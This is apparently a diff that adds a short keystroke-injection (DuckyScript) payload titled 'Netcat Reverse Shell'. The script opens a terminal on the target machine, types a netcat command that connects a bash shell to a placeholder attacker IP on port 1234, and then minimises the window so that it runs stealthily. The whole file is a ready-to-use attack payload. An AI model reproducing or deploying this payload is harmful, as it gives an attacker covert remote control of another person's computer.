@@ -1,0 +1,17 @@
+REM Title: Netcat Reverse Shell
+REM Author: UndedInside
+REM Description: Opens a reverse shell to the attackers IP
+
+REM Open terminal window
+DEFAULT_DELAY 400
+ALT t
+DELAY 1000
+
+REM Start reverse shell
+REM [IP] will need to be replaced with attacker IP
+STRING nc [IP] 1234 -e /bin/bash
+ENTER
+
+REM Minimise window to run stealthily
+ALT F9
+
